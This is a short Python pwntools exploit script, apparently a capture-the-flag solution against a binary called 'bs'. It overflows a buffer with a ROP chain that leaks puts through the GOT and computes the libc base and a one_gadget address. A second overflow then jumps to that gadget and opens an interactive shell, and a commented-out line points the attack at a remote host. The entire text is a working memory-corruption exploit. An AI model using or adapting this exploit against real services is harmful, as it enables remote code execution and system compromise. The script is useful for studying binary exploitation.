#coding:utf-8
from pwn import *

pop_rdi_addr=0x0000000000400c03
puts_got=0x0000000000601FB0
puts_plt=0x00000000004007C0
leave_addr=0x0000000000400A9D
p = process('./bs',env = {"LD_PRELOAD" : "./libc.so"})
# p = remote('202.120.7.202', 6666)
context.log_level = 'debug'
# raw_input('?')
p.recvuntil('?\n')
p.sendline('8192')

payload='\x00'*0x1018+p64(pop_rdi_addr)+p64(puts_got)+p64(puts_plt)+p64(leave_addr)
payload=payload.ljust(0x2000,'\x00')

p.send(payload)

print p.recvuntil('\n')
puts_addr=p.recv(6).ljust(8,'\x00')

puts_addr=u64(puts_addr)
print "puts addr"+hex(puts_addr)
one_gadaget=puts_addr+0x81AC3
print "one_gadaget addr:"+hex(one_gadaget)
libc_addr=one_gadaget-0xF1153
print "libc addr:"+hex(libc_addr)

p.recvuntil('?\n')
p.sendline('8192')
payload='\x00'*0x1018+p64(one_gadaget)
payload=payload.ljust(0x2000,'\x00')
p.send(payload)
p.interactive()
